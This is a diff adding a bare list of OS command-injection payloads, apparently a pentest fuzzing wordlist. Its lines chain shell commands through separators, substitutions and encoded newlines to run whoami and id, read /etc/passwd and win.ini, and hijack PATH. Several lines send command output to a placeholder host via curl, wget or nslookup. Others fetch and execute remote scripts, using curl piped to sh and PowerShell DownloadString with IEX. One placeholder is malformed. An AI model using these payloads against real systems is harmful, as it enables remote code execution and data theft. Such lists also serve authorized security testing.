@@ -1,0 +1,43 @@
+; whoami
+&& id
+|| echo injected
+| uname -a
+& whoami
+&& ver
+|| type C:\\Windows\\win.ini
+| whoami
+$(id)
+`id`
+$(sleep 5)
+`ping -n 5 127.0.0.1`
+; cat /etc/passwd
+; cat /etc/passwd > /tmp/p.out
+; ls > /dev/null
+; type C:\\Windows\\win.ini
+; sleep 5
+&& ping -c 5 127.0.0.1
+; ping -n 5 127.0.0.1
+; whoami && id && pwd
+&& ps aux | grep apache
+; echo $PATH
+; PATH=/malicious:$PATH; whoami
+; IFS=,;`id`
+; curl -s https://{domain}/p?d=$(whoami)
+; wget -qO- https://{domain}/p?d=$(id)
+||nslookup+x.{domain}||
+||ping+-c+10+127.0.0.1||
+%0aid
+%0d%0aid
+$IFS-id
+{id,}
+'; id; '#
+"; id; "#
+) id #
+) && id #
+& powershell -c whoami
+& powershell -c "(New-Object Net.WebClient).DownloadString('https://YOUR-OAST/p')|IEX"
+; curl -s https://{domain}/s.sh | sh
+; wget -qO- https://{domain)/s.sh | sh
+; uname -a; id; whoami; pwd
+; env
+; set
